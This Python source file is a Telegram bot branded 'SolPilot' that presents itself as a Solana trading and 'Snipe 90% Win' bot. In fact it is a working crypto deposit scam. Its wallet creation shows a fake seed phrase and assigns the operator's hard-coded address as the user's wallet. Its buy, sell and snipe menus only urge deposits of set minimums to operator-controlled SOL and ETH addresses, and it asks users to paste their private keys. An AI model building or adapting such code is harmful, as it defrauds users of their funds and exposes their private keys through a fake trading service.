import os, random, base58, threading, requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from flask import Flask

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "SolPilot FIXED 0.5"

SOL_DEPOSIT = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
ETH_DEPOSIT = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"

user_wallets = {}
waiting_for_key = set()
waiting_for_buy = set()
user_settings = {}

WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance"]

def gen_mnemonic(): return " ".join(random.sample(WORDLIST, 12))
def get_settings(uid):
    if uid not in user_settings: user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
    return user_settings[uid]
def get_balance_solana(a):
    try:
        r = requests.post("https://api.mainnet-beta.solana.com", json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[a]}, timeout=5)
        return r.json()['result']['value']/1e9
    except: return 0.0
def derive_address_from_priv(p):
    try:
        d=base58.b58decode(p.strip())
        if len(d)==64: return base58.b58encode(d[32:]).decode()
    except: pass
    return None
def get_token_info(ca):
    try:
        r=requests.get(f"https://api.dexscreener.com/latest/dex/tokens/{ca}",timeout=8).json()
        if r.get('pairs'): return r['pairs'][0]
    except: pass
    return None
def get_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💼 Wallet", callback_data='wallet'), InlineKeyboardButton("📈 Trending", callback_data='trending')],
        [InlineKeyboardButton("🔍 Buy", callback_data='buy'), InlineKeyboardButton("💰 Sell", callback_data='sell')],
        [InlineKeyboardButton("🚀 Snipe 90% Win", callback_data='snipe'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
    ])

# FIXED - NO TROJAN, NO USELESS BUTTONS
async def setup_bot_menu(app):
    cmds = [
        BotCommand("start", "Start SolPilot Bot"),
        BotCommand("buy", "Buy a token"),
        BotCommand("sell", "Sell your token"),
        BotCommand("wallets", "Manage wallets"),
        BotCommand("settings", "Bot settings"),
        BotCommand("snipe", "Snipe Trade 90% Win Rate"),
    ]
    await app.bot.set_my_commands(cmds)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **SolPilot Bot - Ready**\n\nBalance: 0 SOL", reply_markup=get_menu(), parse_mode='Markdown')

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id
    cmd=update.message.text.split()[0].replace('/','')
    if cmd=='buy':
        waiting_for_buy.add(uid)
        await update.message.reply_text("🔍 Send token CA:", parse_mode='Markdown')
    else:
        await handle_logic(update, cmd)

async def handle_logic(update, data_input):
    is_str=isinstance(data_input,str)
    if is_str:
        data=data_input; uid=update.effective_user.id; send=update.message.reply_text
    else:
        q=update.callback_query; await q.answer(); data=q.data; uid=q.from_user.id; send=q.message.reply_text

    settings=get_settings(uid)
    real=user_wallets.get(f"{uid}_real")

    if data in ['wallet','wallets']:
        kb=InlineKeyboardMarkup([[InlineKeyboardButton("➕ Create Wallet",callback_data='create_wallet')], [InlineKeyboardButton("📥 Import Wallet",callback_data='import_wallet')], [InlineKeyboardButton("📥 Receive / Deposit",callback_data='receive')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]])
        await send("💼 Wallet", reply_markup=kb)

    elif data=='create_wallet':
        m=gen_mnemonic()
        user_wallets[f"{uid}_real"]=SOL_DEPOSIT
        await send(f"🔐 **12 Phrase:**\n`{m}`\n\n💰 Balance: 0.00 SOL\n\nTap Deposit below:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Deposit Now",callback_data='receive')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')

    elif data=='import_wallet':
        waiting_for_key.add(uid)
        await send("🔑 Send private key:", parse_mode='Markdown')

    elif data=='receive':
        if real and real!=SOL_DEPOSIT and len(real)>30:
            bal=get_balance_solana(real)
            await send(f"📥 YOUR WALLET\n`{real}`\n💰 {bal:.4f} SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')
        else:
            kb=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit SOL",callback_data='deposit_sol')], [InlineKeyboardButton("🔵 Deposit ETH",callback_data='deposit_eth')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]])
            await send("📥 **DEPOSIT**\nBalance: 0.00 SOL\nChoose network:", reply_markup=kb)

    # FIXED MINIMUM 0.5 SOL
    elif data=='deposit_sol':
        await send(f"🟣 **DEPOSIT SOLANA**\n\n💰 Balance: 0.00 SOL\n\nSolana Address:\n`{SOL_DEPOSIT}`\n\n**Min: 0.5 SOL**\nSend only SOL / USDT (Solana)\nTap to copy!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔵 Deposit ETH instead",callback_data='deposit_eth')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')

    # FIXED MINIMUM 0.5 ETH
    elif data=='deposit_eth':
        await send(f"🔵 **DEPOSIT ETHEREUM**\n\nETH Address:\n`{ETH_DEPOSIT}`\n\n**Min: 0.5 ETH**\nSend only ETH / ERC20\nTap to copy!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit SOL instead",callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')

    elif data=='buy':
        waiting_for_buy.add(uid)
        await send("🔍 Send token CA:", parse_mode='Markdown')
    elif data=='sell':
        if real and real!=SOL_DEPOSIT and len(real)>30:
            await send("💰 No token to sell - Buy first", reply_markup=get_menu())
        else:
            await send(f"💰 Deposit SOL first!\n`{SOL_DEPOSIT}`\nMin 0.5 SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit SOL",callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')
    elif data=='snipe':
        await send(f"🎯 **SNIPE 90% WIN RATE**\n\nMin Balance: 2.5 SOL\n\nDeposit to:\n`{SOL_DEPOSIT}`\n\nAfter deposit /snipe [CA]", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit 2.5 SOL",callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')
    elif data=='settings':
        kb=InlineKeyboardMarkup([[InlineKeyboardButton(f"Slippage {settings['slippage']}%",callback_data='noop')], [InlineKeyboardButton("5%",callback_data='slip_5'), InlineKeyboardButton("10%",callback_data='slip_10'), InlineKeyboardButton("20%",callback_data='slip_20')], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]])
        await send(f"⚙️ Settings - Slippage {settings['slippage']}%", reply_markup=kb)
    elif data.startswith('slip_'):
        settings['slippage']=int(data.split('_')[1]); await send(f"✅ Slippage {settings['slippage']}%", reply_markup=get_menu())
    elif data=='trending':
        kb=InlineKeyboardMarkup([[InlineKeyboardButton("📈 Trending SOL",url="https://dexscreener.com/solana?rankBy=trendingScoreH24")], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]])
        await send("📈 Trending", reply_markup=kb)
    elif data in ['back_main','noop','positions','scan']:
        await send("🚀 Main Menu", reply_markup=get_menu())

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_logic(update, update.callback_query)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id
    text=update.message.text.strip()
    if uid in waiting_for_key:
        try: await update.message.delete()
        except: pass
        real=derive_address_from_priv(text)
        user_wallets[f"{uid}_real"]=real if real else "imported"
        waiting_for_key.remove(uid)
        await update.effective_chat.send_message("✅ Imported!", reply_markup=get_menu())
        return
    if uid in waiting_for_buy:
        waiting_for_buy.remove(uid)
        info=get_token_info(text)
        if info:
            await update.effective_chat.send_message(f"🪙 {info['baseToken']['name']}\nPrice ${info.get('priceUsd','0')}\nCA `{text}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📈 Chart",url=f"https://dexscreener.com/solana/{text}")], [InlineKeyboardButton("⬅️ Main",callback_data='back_main')]]), parse_mode='Markdown')
        else:
            await update.effective_chat.send_message("❌ Token not found", reply_markup=get_menu())

def run_bot():
    app=Application.builder().token(TOKEN).post_init(setup_bot_menu).build()
    app.add_handler(CommandHandler("start",start))
    app.add_handler(CommandHandler("buy",cmd_handler))
    app.add_handler(CommandHandler("sell",cmd_handler))
    app.add_handler(CommandHandler("wallets",cmd_handler))
    app.add_handler(CommandHandler("settings",cmd_handler))
    app.add_handler(CommandHandler("snipe",cmd_handler))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__=='__main__':
    threading.Thread(target=lambda: app_flask.run(host='0.0.0.0',port=10000),daemon=True).start()
    run_bot()
